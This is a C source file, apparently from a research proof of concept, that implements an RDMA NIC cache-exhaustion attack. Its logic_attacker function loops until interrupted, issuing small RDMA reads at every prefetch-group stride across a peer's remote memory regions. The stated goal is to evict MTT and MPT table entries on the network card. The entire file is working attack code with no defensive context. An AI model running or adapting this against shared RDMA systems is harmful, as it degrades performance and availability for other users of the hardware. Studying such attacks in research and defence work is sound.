#include <signal.h>
#include <stdlib.h>
#include "cache_exhauster.h"

const unsigned int PAGE_SIZE = 0x1000;
const unsigned int PREFETCH_GROUP_SIZE = 8;
const unsigned int LOWER_INDEX_FIRST_BIT = 15;
const unsigned int LOWER_INDEX_LAST_BIT = 24;
const unsigned int UPPER_INDEX_FIRST_BIT = 24;
const unsigned int UPPER_INDEX_LAST_BIT = 33;
static volatile int keep_running = 1;

// This basically reads the first byte of each prefetch group in each remote MR .
// This is done in order to evict existing entries in the MTT and MPT tables.
void logic_attacker(struct ibv_qp* qp, ConnectionInfoExchange* peer_info, void* local_buf, uint32_t lkey)
{
    __sighandler_t prev = signal(SIGINT, sigint_handler);
    if (SIG_ERR == prev)
    {
        log_msg("Failed to set signal. Leaving...");
        exit(-1);
    }
    log_msg("Performing the attack infinitely use Ctrl+C (SIGINT) to stop the attack...");
    while (keep_running)
    {
        for (uint32_t i = 0 ; i < peer_info->header.number_of_mrs ; ++i)
        {
            for (uint64_t j = 0  ; j < peer_info->mrs[i].size_in_bytes ; j += PAGE_SIZE * PREFETCH_GROUP_SIZE)
            {
                do_rdma_read((void*)(peer_info->mrs[i].remote_addr + j), local_buf, peer_info->mrs[i].rkey, lkey, 1, qp);
            }
        }
    }
    prev = signal(SIGINT, prev);
    if (SIG_ERR == prev)
    {
        log_msg("Failed to set signal. Leaving...");
        exit(-1);
    }
}

void sigint_handler(int value)
{
    keep_running = 0;
}